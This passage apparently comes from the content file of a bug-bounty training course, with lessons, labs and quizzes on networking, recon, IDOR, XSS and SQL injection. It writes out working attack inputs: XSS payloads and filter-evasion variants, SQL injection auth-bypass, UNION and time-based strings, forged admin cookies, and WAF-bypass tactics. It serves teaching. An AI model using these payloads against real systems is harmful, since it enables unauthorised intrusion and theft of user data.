      <li><strong>Link-local</strong> — <code>169.254.0.0/16</code>. Includes <code>169.254.169.254</code>, the cloud metadata endpoint — the SSRF crown jewel.</li>
      <li><strong>Public</strong> — everything else; what you resolve a domain to.</li>
    </ul>
    <h3>CIDR in scope pages</h3>
    <p>Programs often define scope as CIDR, e.g. <code>203.0.113.0/24</code> — that's 256 addresses you may test. Reading CIDR correctly keeps you <em>in scope</em> (and out of jail). IPv6 exists too (128-bit, <code>2001:db8::1</code>) and is increasingly in scope — same concepts, bigger numbers. The next lab makes subnet math automatic.</p>
    <div class="note"><span class="nt">Why it pays</span><p>SSRF impact is "which internal things can I reach?" — answerable only if you know the private ranges. And mis-reading a CIDR scope is one of the fastest ways to accidentally test something you weren't allowed to.</p></div>`},
  {id:"net.4",type:"lab",title:"Lab: subnet calculator",lab:"subnet",html:`
    <p>A working IPv4 subnet calculator. Enter an address and a CIDR suffix to see the network, broadcast, usable host range, host count and mask — and whether the address is public, private, loopback or link-local. Calculate any subnet to complete the lab, then try the scope examples.</p>`},
  {id:"net.5",type:"theory",title:"TCP, UDP & ports",html:`
    <p>Layer 4 gets data to the right <em>program</em> on a host, using <strong>ports</strong> (0–65535). An IP address finds the machine; the port finds the service on it. <code>example.com:443</code> = the web server; <code>:22</code> = SSH.</p>
    <h3>TCP vs UDP</h3>
    <ul>
      <li><strong>TCP</strong> — connection-oriented and reliable. It sets up a connection, guarantees ordered delivery, and retransmits losses. HTTP, HTTPS, SSH, FTP use it. This reliability starts with the three-way handshake.</li>
      <li><strong>UDP</strong> — connectionless, fire-and-forget, fast, no guarantees. DNS, VoIP, QUIC/HTTP3 use it.</li>
    </ul>
    <h3>The TCP three-way handshake</h3>
    <pre><code>Client ──<span class="kw">SYN</span>──────────▶ Server   <span class="cmt">"let's talk, seq=x"</span>
Client ◀────<span class="kw">SYN-ACK</span>──── Server   <span class="cmt">"ok, seq=y, ack=x+1"</span>
Client ──<span class="kw">ACK</span>──────────▶ Server   <span class="cmt">"confirmed" → connection ESTABLISHED</span></code></pre>
    <p>Only after this do HTTP bytes flow. A port that completes the handshake is <strong>open</strong>; one that refuses or drops is closed/filtered — exactly what a port scanner (<code>nmap</code>) measures.</p>
    <h3>Ports a hunter watches</h3>
    <p>Recon isn't only web (80/443). Non-standard open ports expose forgotten services — a dev server on <code>8080</code>, a database on <code>3306</code>, Redis on <code>6379</code>, an admin panel on <code>8443</code>. The next lab lets you step through the handshake and search the ports that matter.</p>
    <div class="note"><span class="nt">Why it pays</span><p>Whole classes of findings start with "there's an unexpected service on port X". Scanning the full port range on in-scope hosts surfaces attack surface nobody else looked at.</p></div>`},
  {id:"net.6",type:"lab",title:"Lab: handshake & port recon",lab:"ports",html:`
    <p>Two tools. Step through the <strong>TCP three-way handshake</strong> to watch a connection form packet by packet, then search the <strong>common-ports reference</strong> for the services you'll meet in recon. Complete the handshake to finish the lab.</p>`},
  {id:"net.7",type:"theory",title:"DNS — the internet's phonebook",html:`
    <p>Humans use names (<code>shop.example.com</code>); the network uses IP addresses. DNS translates between them — and for a bug hunter, it's one of the richest recon sources on the internet.</p>
    <h3>Record types you'll use</h3>
    <ul>
      <li><strong>A / AAAA</strong> — name → IPv4 / IPv6 address.</li>
      <li><strong>CNAME</strong> — an alias pointing one name at another. A CNAME pointing at a de-provisioned service = <em>subdomain takeover</em>.</li>
      <li><strong>MX</strong> — mail servers. <strong>TXT</strong> — arbitrary text (SPF, verification, sometimes leaked secrets).</li>
      <li><strong>NS</strong> — which servers are authoritative for a zone. <strong>SOA</strong> — the zone's admin record.</li>
    </ul>
    <h3>How a name resolves</h3>
    <p>Your resolver walks a hierarchy: ask a <strong>root</strong> server (who handles <code>.com</code>?), then the <strong>TLD</strong> server (who's authoritative for <code>example.com</code>?), then the <strong>authoritative</strong> server (what's the A record for <code>shop.example.com</code>?). Answers are cached for their <strong>TTL</strong>. The next lab walks this step by step.</p>
    <h3>Why DNS is a recon goldmine</h3>
    <ul>
      <li><strong>Subdomain enumeration</strong> — tools pull names from Certificate Transparency logs, brute-force, and DNS to find <code>staging.</code>, <code>admin.</code>, <code>vpn.</code> hosts = more attack surface.</li>
      <li><strong>Subdomain takeover</strong> — dangling CNAMEs, straight from DNS records (you built a lab for this).</li>
      <li><strong>Out-of-band detection</strong> — blind SSRF/XXE are proven by making the target do a DNS lookup to <em>your</em> server (Burp Collaborator). DNS almost always escapes, even when HTTP is filtered.</li>
    </ul>
    <div class="note"><span class="nt">Why it pays</span><p>More subdomains = more surface = more non-duplicate bugs. DNS recon is the single highest-leverage habit for a beginner on wide-scope programs.</p></div>`},
  {id:"net.8",type:"lab",title:"Lab: DNS resolution walkthrough",lab:"dns",html:`
    <p>Watch <code>shop.example.com</code> resolve from nothing to an IP, one query at a time: resolver → root → TLD → authoritative → answer. Step through to the final A record to complete the lab.</p>`},
  {id:"net.9",type:"theory",title:"HTTP, HTTPS & TLS — why Burp sees everything",html:`
    <p>HTTP is a simple <em>text</em> protocol — human-readable requests and responses (you've been reading them all course). HTTPS is just <strong>HTTP wrapped in TLS encryption</strong>. Understanding that wrapper explains how you intercept "encrypted" traffic.</p>
    <h3>The TLS handshake (simplified)</h3>
    <pre><code>1. Client hello  ─▶  <span class="cmt">supported ciphers, random</span>
2. Server hello  ◀─  <span class="cmt">chosen cipher + certificate (public key)</span>
3. Client verifies the cert against trusted CAs
4. Key exchange  ─▶  <span class="cmt">both derive a shared session key</span>
5. Encrypted HTTP flows over the tunnel</code></pre>
    <h3>Certificates & trust — the key insight for Burp</h3>
    <p>Your browser trusts a site because its certificate is signed by a <strong>Certificate Authority (CA)</strong> your device already trusts. TLS stops a <em>stranger</em> in the middle from reading your traffic.</p>
    <p>So how does Burp read your HTTPS? You <strong>install Burp's own CA certificate</strong> into your browser's trust store. Now your browser willingly trusts Burp's "man-in-the-middle": browser ⇄ Burp (one TLS tunnel) ⇄ server (another). Burp decrypts, shows you everything, re-encrypts. It works <em>only because you chose to trust Burp</em> — an attacker can't do this to a victim without installing a cert on their machine. That's the whole security model in one sentence.</p>
    <h3>Versions, briefly</h3>
    <p>HTTP/1.1 (text), HTTP/2 (binary, multiplexed), HTTP/3 (over UDP/QUIC). Mostly transparent to you, but HTTP/2 enables some request-smuggling variants, and desync bugs are a lucrative advanced niche.</p>
    <div class="note"><span class="nt">Why it pays</span><p>Certificate Transparency logs (every issued cert is public) are a top subdomain-discovery source. And knowing TLS is why you never panic at "but it's HTTPS" — you own the trust store on your own testing machine.</p></div>`},
  {id:"net.10",type:"lab",title:"Lab: trace a request end-to-end",lab:"journey",html:`
    <p>The capstone. Type a URL and follow a single request through the entire stack — DNS resolution, TCP handshake, TLS handshake, the HTTP request, and the response — seeing which layer does what and where you, the hunter, can interfere. Reach the response to complete the lab.</p>`},
  {id:"net.11",type:"theory",title:"Proxies, NAT, CDNs, WAFs & load balancers",html:`
    <p>Between your browser and the actual application sits a lot of infrastructure. Knowing what each box does turns confusing behavior into findings.</p>
    <h3>The middle boxes</h3>
    <ul>
      <li><strong>Forward proxy</strong> — sits in front of <em>clients</em> (Burp is one). <strong>Reverse proxy</strong> — sits in front of <em>servers</em>, routing requests in (nginx, load balancers).</li>
      <li><strong>NAT</strong> — lets many private IPs share one public IP. Why your home devices all look like one address outside.</li>
      <li><strong>Load balancer</strong> — spreads traffic across many backend servers. Inconsistent behavior between requests can mean you're hitting different backends (sometimes one is misconfigured).</li>
      <li><strong>CDN</strong> (Cloudflare, Akamai) — caches content at the edge, close to users, and hides the <strong>origin server's IP</strong>.</li>
      <li><strong>WAF</strong> — a Web Application Firewall that inspects requests and blocks payloads that look malicious.</li>
    </ul>
    <h3>Where this becomes bugs</h3>
    <ul>
      <li><strong>Origin IP discovery</strong> — find the real server IP behind a CDN/WAF (via old DNS records, SSL certs, subdomains) and hit it directly to <strong>bypass the WAF</strong> entirely. Common, high-value.</li>
      <li><strong>Host header attacks</strong> — reverse proxies route by the <code>Host</code> header; abusing it causes cache poisoning, password-reset poisoning, routing to internal apps.</li>
      <li><strong>X-Forwarded-For spoofing</strong> — proxies add this header with the client's IP; apps that trust it blindly can be fooled for access control or rate-limit bypass.</li>
      <li><strong>Caching bugs</strong> — CDNs caching responses they shouldn't → leaking other users' data (web cache deception).</li>
    </ul>
    <div class="note"><span class="nt">Why it pays</span><p>WAF bypass via origin IP and Host-header attacks are bread-and-butter for intermediate hunters — and they only make sense once you can picture the proxy chain this lesson draws.</p></div>`},
  {id:"net.12",type:"quiz",title:"Checkpoint: networking",quiz:[
    {q:"An SSRF returns data from 10.0.4.12. What does that address tell you?",opts:["It's a public website","You've reached a private (internal) RFC 1918 host — the server is pivoting inside its network","It's the cloud metadata endpoint"],a:1,ex:"10.0.0.0/8 is private/internal. Reaching it via SSRF proves you can touch the target's internal network — strong impact."},
    {q:"Why can Burp Suite read your HTTPS traffic when a random attacker on your Wi-Fi cannot?",opts:["Burp cracks the encryption","You installed Burp's CA certificate, so your browser trusts its man-in-the-middle","HTTPS is actually unencrypted"],a:1,ex:"Interception works because you chose to trust Burp's CA. Without installing a cert, a stranger's MITM fails cert validation."},
    {q:"You want to prove a BLIND SSRF with no visible response. Best signal?",opts:["Guess","Make the server do a DNS/HTTP lookup to your listener (Collaborator) and watch for the callback","Reload the page"],a:1,ex:"Out-of-band DNS/HTTP interaction from the target's IP proves the server made your request, even when nothing is shown."},
    {q:"A site is behind a WAF that blocks your payloads. A promising bypass is to:",opts:["Give up","Find the origin server's real IP (old DNS, certs) and hit it directly, skipping the WAF","Send the payload 100 times"],a:1,ex:"If the origin accepts direct traffic, reaching its IP bypasses the edge WAF entirely — a classic, high-value technique."}
  ]}
]},
{code:"MOD_01",title:"How the Web Breaks",blurb:"HTTP, cookies, sessions and the browser trust model — then your first hands-on request-tampering lab.",lessons:[
  {id:"1.1",type:"theory",title:"HTTP, the only protocol that matters",html:`
    <p>Almost every web bug is a creative abuse of an HTTP request. If you truly understand the request/response cycle, you can find bugs. Let's nail it.</p>
    <h3>Anatomy of a request</h3>
    <pre><code><span class="kw">POST</span> /api/account/update HTTP/2
Host: shop.example.com
Cookie: session=a1b2c3d4...
Content-Type: application/json
<span class="cmt">(blank line separates headers from body)</span>
{"user_id": 1024, "email": "me@x.com"}</code></pre>
    <p>Every part is attacker-controllable except what the server enforces. The <strong>method</strong> (<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>), the <strong>path</strong>, every <strong>header</strong>, the <strong>cookies</strong>, and the <strong>body</strong> — you can change all of it in Burp. The server <em>hopes</em> you won't. Bugs live in that gap between "hope" and "enforce".</p>
    <h3>Status codes tell you secrets</h3>
    <ul>
      <li><code>200</code> OK — it worked (interesting if it <em>shouldn't</em> have).</li>
      <li><code>302</code> redirect — often where auth logic hides.</li>
      <li><code>401</code> vs <code>403</code> — "who are you?" vs "I know you, but no." A <code>403</code> that becomes <code>200</code> when you tweak a header is a finding.</li>
      <li><code>500</code> — the server choked. Error messages leak stack traces, queries, paths. Gold.</li>
    </ul>
    <h3>Cookies & sessions — the identity layer</h3>
    <p>HTTP is stateless. The server only knows who you are because your browser sends a <strong>session cookie</strong> on every request. Break, steal, or forge that token and you become someone else. Watch for session IDs that are guessable, don't rotate after login, or live in JWTs the client can tamper with (you'll exploit exactly that in a later CTF).</p>
    <div class="note"><span class="nt">Mentor note</span><p>Open any site in Burp and just <em>read</em> the traffic for 20 minutes before trying to break anything. Reconnaissance of normal behavior is how you spot the abnormal. Hunters who skip this stage are swinging blind.</p></div>`},
  {id:"1.2",type:"theory",title:"The browser trust model",html:`
    <p>Web security is a set of walls the browser puts up to stop evil-site.com from reading your bank. When those walls have gaps, you get bugs. Know the walls.</p>
    <h3>Same-Origin Policy (SOP)</h3>
    <p>An <strong>origin</strong> is scheme + host + port (<code>https://app.example.com:443</code>). By default, JavaScript on one origin <em>cannot read</em> responses from another origin. This is why XSS is so powerful — it runs code <em>inside</em> the victim's origin, bypassing SOP entirely.</p>
    <h3>CORS — poking holes in SOP (safely, in theory)</h3>
    <p>Cross-Origin Resource Sharing lets a server say "these other origins may read my responses." Misconfigure it — e.g. reflect any <code>Origin</code> back in <code>Access-Control-Allow-Origin</code> with <code>Allow-Credentials: true</code> — and any website can read a logged-in user's private data. Common, payable bug.</p>
    <h3>Where trust boundaries break</h3>
    <ul>
      <li><strong>Client-side trust.</strong> Anything enforced only in JavaScript (hidden form fields, disabled buttons, price in the request body) is not enforced at all. The client is the attacker's turf.</li>
      <li><strong>Implicit trust of input.</strong> Every place user input crosses into HTML, SQL, a system command, a URL fetch, or a file path is a potential injection point.</li>
      <li><strong>Trust of identity claims.</strong> <code>user_id=1024</code> in a request the server doesn't re-check = IDOR.</li>
    </ul>
    <div class="note"><span class="nt">The hunter's mantra</span><p>"Where does user input go, and what does the server <em>assume</em> about it?" Every bug you'll ever find is an answer to that one question. Tape it to your monitor.</p></div>`},
  {id:"1.3",type:"lab",title:"Lab: intercept & tamper a request",lab:"intercept",html:`
    <p>This is the single most important skill in web hacking: catching a request in flight and changing what the server <em>assumed</em> you'd send. Below is a simulated checkout request, the way it'd look caught in Burp. The server trusts the client to send an honest <code>price</code> and <code>role</code>. It shouldn't.</p>
    <p><strong>Goal:</strong> modify the request so you buy the item for <code>0</code> <em>and</em> escalate your role. The server reveals a flag when both abuses land at once.</p>`},
  {id:"1.4",type:"quiz",title:"Checkpoint: web mechanics",quiz:[
    {q:"A page disables the 'Submit' button in JavaScript until you're 'verified'. How much does this protect the server-side action?",opts:["Fully — the button can't be clicked","Not at all — the client is attacker-controlled; just send the request directly","Partially"],a:1,ex:"Client-side controls are suggestions. In Burp you craft the request by hand, button or not. Only server-side checks count."},
    {q:"An endpoint returns 403 Forbidden. You add the header X-Original-URL or change the method to POST and get 200 OK. This is:",opts:["Normal behavior","A potential access-control bypass worth reporting","A server error"],a:1,ex:"Inconsistent authorization across methods/headers is a classic, payable access-control bypass."},
    {q:"Why is Cross-Site Scripting (XSS) so dangerous despite the Same-Origin Policy?",opts:["It disables the firewall","It runs code INSIDE the victim's origin, so SOP doesn't stop it","It only affects old browsers"],a:1,ex:"XSS executes in the target's own origin, inheriting all its trust — cookies, DOM, everything. SOP protects against outside origins, not injected code."}
  ]}
]},

{code:"MOD_02",title:"Recon & Attack Surface",blurb:"Find the doors before you test the locks: subdomains, hidden endpoints, and secrets devs leave in JavaScript.",lessons:[
  {id:"2.1",type:"theory",title:"Mapping the target",html:`
    <p>Bounties are won in recon. The hunter who finds the forgotten <code>staging-v2.example.com</code> box tests a surface nobody else saw. More surface = more bugs = less competition.</p>
    <h3>The recon funnel</h3>
    <ul>
      <li><strong>Subdomain enumeration.</strong> <code>subfinder -d example.com</code> pulls subdomains from certificate logs, DNS, and search engines. Pipe to <code>httpx</code> to see which are alive. You're hunting for staging, dev, admin, legacy, and acquisition boxes.</li>
      <li><strong>Content discovery.</strong> <code>ffuf</code> brute-forces paths against a wordlist: <code>ffuf -u https://site/FUZZ -w wordlist.txt</code>. Finds <code>/admin</code>, <code>/.git</code>, <code>/backup.zip</code>, <code>/api/v1/</code> — things not linked anywhere.</li>
      <li><strong>Parameter discovery.</strong> Hidden GET/POST params are injection points nobody tests. Tools like <code>arjun</code> and <code>param-miner</code> surface them.</li>
      <li><strong>JavaScript analysis.</strong> Modern apps ship their whole API map in JS bundles. Read them.</li>
    </ul>
    <h3>Read the JavaScript — always</h3>
    <p>Front-end JS files reference every API endpoint the app uses, including admin-only and unreleased ones. Developers also leave comments, debug flags, and sometimes <strong>hardcoded secrets</strong> (API keys, tokens) right in the bundle. Grepping JS for <code>api</code>, <code>token</code>, <code>secret</code>, <code>/v2/</code>, <code>admin</code> is one of the highest-ROI beginner moves there is.</p>
    <div class="note money"><span class="nt">Where beginners win</span><p>Pick programs with a <strong>wide scope</strong> (<code>*.company.com</code>). Spend your first week only doing recon and reading JS — no exploitation. You'll build a map of untested endpoints that pays off for months.</p></div>`},
  {id:"2.2",type:"theory",title:"Thinking in attack surface",html:`
    <p>Attack surface is every point where you can feed input to the system. Train yourself to see it everywhere:</p>
    <ul>
      <li>Every <strong>input field</strong>, URL parameter, and JSON key.</li>
      <li>Every <strong>file upload</strong> (filename, content, content-type).</li>
      <li>Every <strong>header</strong> the app reads (<code>Host</code>, <code>X-Forwarded-For</code>, <code>Referer</code>, <code>User-Agent</code>).</li>
      <li>Every <strong>redirect</strong>, <strong>webhook</strong>, and URL the server fetches on your behalf (→ SSRF).</li>
      <li>Every <strong>ID</strong> in a request (→ IDOR).</li>
      <li>Every place two features <strong>interact</strong> (coupon + refund, invite + billing → business logic).</li>
    </ul>
    <h3>Prioritize ruthlessly</h3>
    <p>You can't test everything. Rank endpoints by: does it touch <strong>other users' data</strong>? Does it handle <strong>money</strong>? Is it <strong>authenticated</strong> (less tested by anonymous scanners)? Is it <strong>new or obscure</strong> (staging, v2 APIs)? High-value + low-competition is the sweet spot.</p>
    <div class="note"><span class="nt">Mentor note</span><p>Keep a running "target map" in your notes: one line per endpoint — method, path, params, what it does, and whether you've tested it for each bug class. This turns chaotic poking into a systematic sweep, and it's exactly the discipline your SOC analyst brain is already good at.</p></div>`},
  {id:"2.3",type:"ctf",title:"CTF: read the bundle",lab:"jsrecon",flag:"RkxBR3tqc19yZWNvbl9uZXZlcl9za2lwX3RoZV9idW5kbGV9",html:`
    <p>A developer shipped this snippet inside a production JavaScript bundle. Somewhere in here is a leaked internal endpoint and a token that was never meant to reach the client. Read it like a hunter: find the secret, decode it, submit the flag.</p>
    <pre><code><span class="cmt">// app.min.js  (excerpt)</span>
const API=<span class="str">"https://api.shop.example.com"</span>;
<span class="cmt">// TODO(dev): remove before launch — internal export</span>
const _DEBUG_ENDPOINT=<span class="str">"/api/v2/_internal/user_export"</span>;
const _bootstrap=atob(<span class="str">"RkxBR3tqc19yZWNvbl9uZXZlcl9za2lwX3RoZV9idW5kbGV9"</span>);
if(window.__DEV__){console.log(<span class="str">"export token:"</span>,_bootstrap);}</code></pre>
    <p><strong>Your task:</strong> that <code>atob(...)</code> call base64-decodes a value on page load. Decode the string yourself and submit what it produces. (Hint: <code>atob</code> is just base64-decode. The lab below has a decoder if you want it.)</p>`},
  {id:"2.4",type:"quiz",title:"Checkpoint: recon",quiz:[
    {q:"What makes a wide-scope program (*.company.com) attractive to a beginner?",opts:["Bigger bounties guaranteed","More untested surface = less competition on forgotten hosts","Easier reports"],a:1,ex:"Breadth means forgotten staging/legacy hosts that veterans skipped — your best shot at non-duplicate findings."},
    {q:"Why read a site's JavaScript bundles?",opts:["They're required reading for CSS","They map every API endpoint and sometimes leak tokens/secrets","To improve page speed"],a:1,ex:"JS bundles reveal hidden endpoints, admin routes, and occasionally hardcoded secrets — pure recon gold."},
    {q:"You find /backup.zip via content discovery. Best first move?",opts:["Download and check if it exposes source/data (in scope), then report","Share it publicly","Ignore it"],a:0,ex:"Exposed backups often leak source code or credentials — high-impact info disclosure, if the host is in scope."}
  ]}
]},

{code:"MOD_03",title:"Broken Access Control & IDOR",blurb:"The #1 beginner moneymaker. If the server forgets to ask 'are you allowed?', you get paid.",lessons:[
  {id:"3.1",type:"theory",title:"IDOR: when IDs aren't protected",html:`
    <p><span class="sev high">High</span> <span class="sev pay">Pays well</span> Broken Access Control is #1 on the OWASP Top 10 for a reason: it's everywhere and it's valuable. <strong>IDOR</strong> (Insecure Direct Object Reference) is its most beginner-friendly form.</p>
    <h3>The mechanism</h3>
    <p>The app shows you <em>your</em> data via a request like:</p>
    <pre><code><span class="kw">GET</span> /api/invoice?id=<span class="hl">1024</span>
Cookie: session=...you...</code></pre>
    <p>The question every hunter asks: <strong>what happens if I change <code>1024</code> to <code>1023</code>?</strong> If the server returns someone else's invoice, it authenticated you (valid session) but never <em>authorized</em> you (is this <em>your</em> invoice?). That's IDOR.</p>
    <h3>Two flavors</h3>
    <ul>
      <li><strong>Horizontal privilege escalation</strong> — accessing another user at your own level (their invoice, their messages). Change the ID.</li>
      <li><strong>Vertical privilege escalation</strong> — gaining a higher level (user → admin). Often via a <code>role</code> field, an admin-only endpoint you can still reach, or a tampered token.</li>
    </ul>
    <h3>Where IDOR hides</h3>
    <ul>
      <li>Numeric IDs in URLs, bodies, and headers (<code>?user=</code>, <code>/orders/5001</code>).</li>
      <li>UUIDs that <em>look</em> random but leak in other responses (not actually secret).</li>
      <li>Filenames, document IDs, "download" links.</li>
      <li>Second-order: an ID in a POST body the UI never lets you change.</li>
    </ul>
    <div class="note warn"><span class="nt">Prove it ethically</span><p>On real programs, demonstrate IDOR with <strong>two accounts you own</strong> (A and B): log in as A, access B's object, screenshot. Never pull a real stranger's data — that's a privacy violation even with a bounty invite.</p></div>`},
  {id:"3.2",type:"lab",title:"Lab: enumerate the invoices",lab:"idor",html:`
    <p>You're logged in as a normal customer. Your own invoice is <code>#1024</code>. The API below trusts whatever <code>id</code> you ask for. Enumerate: change the ID and see whose data comes back. Somewhere in the low numbers is an <strong>admin/internal</strong> invoice that should never be reachable — it holds the flag.</p>
    <p><strong>Goal:</strong> find the invoice that leaks the flag by abusing the missing authorization check.</p>`},
  {id:"3.3",type:"ctf",title:"CTF: forge your role",lab:"rolecookie",flag:"",html:`
    <p>This app stores your identity in a <strong>client-side cookie</strong> and trusts it blindly — a vertical privilege escalation waiting to happen. Here's the session cookie handed to your browser:</p>
    <pre><code>session=<span class="hl">eyJ1aWQiOjEwMjQsInJvbGUiOiJ1c2VyIn0</span></code></pre>
    <p>That's base64-encoded JSON. <strong>Decode it, change your role to <code>admin</code>, re-encode it, and submit the forged cookie value below.</strong> The server (simulated) will accept it only if it decodes to valid JSON with <code>uid=1024</code> and <code>role=admin</code>. Use the decoder/encoder in the lab to help.</p>`},
  {id:"3.5",type:"lab",title:"Lab: mass assignment",lab:"massassign",html:`
    <p><span class="sev high">High</span> Mass assignment (a.k.a. autobinding / object injection) is access control's quiet cousin — and a specialist favorite. The app binds your whole JSON body to a database object. The form only shows you <code>name</code> and <code>email</code>, but if the server blindly saves every field you send, you can add one it never meant to expose — like <code>isAdmin</code>.</p>
    <p>Below is your "edit profile" request. The front-end only sends name + email. <strong>Add a field that grants yourself admin.</strong></p>`},
  {id:"3.4",type:"quiz",title:"Checkpoint: access control",quiz:[
    {q:"You change ?id=1024 to ?id=1023 and get another user's data back. Your session is valid. What's the flaw?",opts:["Authentication is broken","Authorization is missing — the server never checks the object belongs to you","Nothing, IDs are public"],a:1,ex:"Classic IDOR: you're authenticated but not authorized. The server must verify the object belongs to the requesting user."},
    {q:"An endpoint uses random UUIDs instead of numbers. Is it automatically safe from IDOR?",opts:["Yes, UUIDs are unguessable","No — if the UUID leaks in another response, you can still abuse it","Only if HTTPS is used"],a:1,ex:"UUIDs are not authorization. If they appear in other responses, logs, or referrers, they're just long IDs you can reuse."},
    {q:"The safest way to prove an IDOR on a live, in-scope program is:",opts:["Pull a random real user's records as proof","Use two accounts you control and access one from the other","Scan all IDs rapidly"],a:1,ex:"Two self-owned accounts prove impact without violating a real person's privacy. Never exfiltrate strangers' data."}
  ]}
]},

{code:"MOD_04",title:"Cross-Site Scripting (XSS)",blurb:"Inject your JavaScript into someone else's page. The classic, and still one of the most reported paid bugs.",lessons:[
  {id:"4.1",type:"theory",title:"The three faces of XSS",html:`
    <p><span class="sev med">Medium</span>–<span class="sev high">High</span> <span class="sev pay">Pays</span> XSS = getting <em>your</em> JavaScript to run in <em>someone else's</em> browser, inside the target's origin. Because it runs inside the origin, it can read cookies, hijack sessions, rewrite the page, and act as the victim.</p>
    <h3>Reflected XSS</h3>
    <p>Input from the request is echoed straight back into the response, unescaped. Classic in search boxes and error messages:</p>
    <pre><code><span class="cmt">You search: &lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="cmt">Server responds:</span>
&lt;h2&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h2&gt;  <span class="danger">← your script runs</span></code></pre>
    <p>Impact requires the victim to click your crafted link, so it's usually Medium — still very payable.</p>
    <h3>Stored XSS</h3>
    <p>Your payload is <em>saved</em> (a comment, profile name, support ticket) and runs for <strong>every user who views it</strong>. No link needed. This is the dangerous, High-severity flavor — a stored XSS in an admin panel can mean full account takeover of staff.</p>
    <h3>DOM-based XSS</h3>
    <p>The vulnerability is entirely client-side: JavaScript reads something attacker-controlled (<code>location.hash</code>, <code>document.referrer</code>) and writes it into the page via a dangerous sink (<code>innerHTML</code>, <code>eval</code>, <code>document.write</code>) without sanitizing. The server never sees the payload — you find these by reading JS.</p>
    <div class="note"><span class="nt">Mentor note</span><p>For bounties, always escalate beyond <code>alert(1)</code>. Triagers want <em>impact</em>: show cookie theft, a session-stealing PoC, or an action performed as the victim. "It pops an alert" is a weaker report than "it exfiltrates the session token to my server."</p></div>`},
  {id:"4.2",type:"theory",title:"Context & filter evasion",html:`
    <p>XSS is all about <strong>context</strong> — where your input lands decides the payload.</p>
    <h4>HTML context</h4>
    <p>Input between tags → inject a new tag: <code>&lt;img src=x onerror=alert(1)&gt;</code>. The <code>onerror</code> trick fires without needing <code>&lt;script&gt;</code>, which is often filtered.</p>
    <h4>Attribute context</h4>
    <p>Input inside an attribute → break out of it first: <code>"&gt;&lt;svg onload=alert(1)&gt;</code> or inject an event handler if you can't escape the quotes.</p>
    <h4>JavaScript context</h4>
    <p>Input inside a <code>&lt;script&gt;</code> block or a JS string → break the string/statement: <code>';alert(1);//</code>.</p>
    <h3>Beating filters</h3>
    <ul>
      <li>Blocked <code>&lt;script&gt;</code>? Use event handlers: <code>onerror</code>, <code>onload</code>, <code>onfocus autofocus</code>.</li>
      <li>Blocked parentheses? <code>alert\`1\`</code> (template literals), or <code>onerror=alert;throw 1</code>.</li>
      <li>Keyword filters? Mixed case <code>&lt;ScRiPt&gt;</code>, or HTML entities the browser decodes.</li>
      <li>Modern apps use a <strong>Content Security Policy (CSP)</strong> that blocks inline scripts. Bypassing CSP (via a JSONP endpoint, an allowed CDN, a <code>base-uri</code> gap) is an advanced, well-paid skill.</li>
    </ul>
    <div class="note warn"><span class="nt">Framework reality</span><p>React/Vue/Angular auto-escape output, so blind reflected XSS is rarer than it was. Today's XSS lives in: <code>dangerouslySetInnerHTML</code>, DOM sinks, markdown renderers, SVG uploads, old jQuery <code>.html()</code>, and un-sanitized server templates. Hunt the edges.</p></div>`},
  {id:"4.3",type:"lab",title:"Lab: reflected XSS playground",lab:"xss",html:`
    <p>Below is a <strong>deliberately vulnerable</strong> mock search page running in a locked-down sandbox (it's a sandboxed iframe — it can't touch anything real). It reflects your query straight into its HTML with no escaping. Your job: craft a payload that actually <strong>executes JavaScript</strong>. When your code runs, it signals the parent and reveals the flag.</p>
    <p><strong>Goal:</strong> get your injected script to run. Try to think past <code>&lt;script&gt;</code> too — the classic image-error trick is the real workhorse.</p>`},
  {id:"4.5",type:"lab",title:"Lab: DOM-based XSS",lab:"domxss",html:`
    <p><span class="sev med">Medium</span>–<span class="sev high">High</span> DOM XSS never touches the server — the vulnerability is in the page's own JavaScript. Here the app reads a value from the URL fragment (<code>#...</code>) and writes it into the page with <code>innerHTML</code>, a dangerous sink. The server never sees your payload, so server-side filters are useless and scanners often miss it entirely. You find these by <em>reading the JS</em>.</p>
    <p>Below, whatever you put in the "fragment" is sunk into <code>innerHTML</code>. <strong>A <code>&lt;script&gt;</code> tag won't run via innerHTML — but an element with an event handler will.</strong> Make your code execute.</p>`},
  {id:"4.4",type:"quiz",title:"Checkpoint: XSS",quiz:[
    {q:"Your input lands inside an HTML attribute: value=\"HERE\". <script> tags are stripped. Best approach?",opts:["Give up, it's patched","Break out of the attribute: \">&lt;svg onload=alert(1)&gt;","Use SQL injection instead"],a:1,ex:"Escape the attribute context first (close the quote and tag), then inject a fresh element with an event handler."},
    {q:"Why is stored XSS usually rated higher than reflected XSS?",opts:["It's harder to write","It runs for every user who views the content — no victim interaction needed","It only affects admins"],a:1,ex:"Stored payloads execute automatically for all viewers, giving far broader impact than a reflected link a victim must click."},
    {q:"For a strong bounty report, your XSS PoC should demonstrate:",opts:["alert(1) and nothing more","Real impact — e.g. session/cookie theft or an action as the victim","The page's CSS"],a:1,ex:"Triage pays for impact. Show what an attacker gains (session theft, account actions), not just that script executes."}
  ]}
]},

{code:"MOD_05",title:"SQL Injection",blurb:"Make the database run your queries. Rarer than it was, still devastating and well-paid when found.",lessons:[
  {id:"5.1",type:"theory",title:"Speaking the database's language",html:`
    <p><span class="sev crit">Critical</span>–<span class="sev high">High</span> SQLi happens when user input is concatenated into a database query instead of being safely parameterized. You stop being <em>data</em> and start being <em>code</em>.</p>
    <h3>The vulnerable pattern</h3>
    <pre><code><span class="cmt">// Server builds this by gluing your input in:</span>
query = <span class="str">"SELECT * FROM users WHERE name='"</span> + input + <span class="str">"'"</span>;</code></pre>
    <p>Send <code>name = ' OR '1'='1</code> and the query becomes <code>... WHERE name='' OR '1'='1'</code> — always true. The database returns every row.</p>
    <h3>Authentication bypass</h3>
    <p>On a login checking <code>WHERE user='$u' AND pass='$p'</code>, inject into the username:</p>
    <pre><code>username: <span class="danger">admin'-- </span>
<span class="cmt">→ WHERE user='admin'-- ' AND pass='...'</span>
<span class="cmt">The -- comments out the password check. You're admin.</span></code></pre>
    <h3>UNION-based extraction</h3>
    <p>If results are displayed, <code>UNION SELECT</code> appends your own query to pull data from <em>other</em> tables: <code>' UNION SELECT username,password FROM users-- </code>. You need the right column count (find it with <code>ORDER BY n</code>).</p>
    <h3>Blind SQLi</h3>
    <p>When nothing's displayed, you ask yes/no questions and read the answer from the app's <em>behavior</em> — boolean (page changes) or time-based (<code>'; IF(...) SLEEP(5)--</code> makes it hang). Slow, automatable with <code>sqlmap</code> (but scanners are often banned — know the manual method).</p>
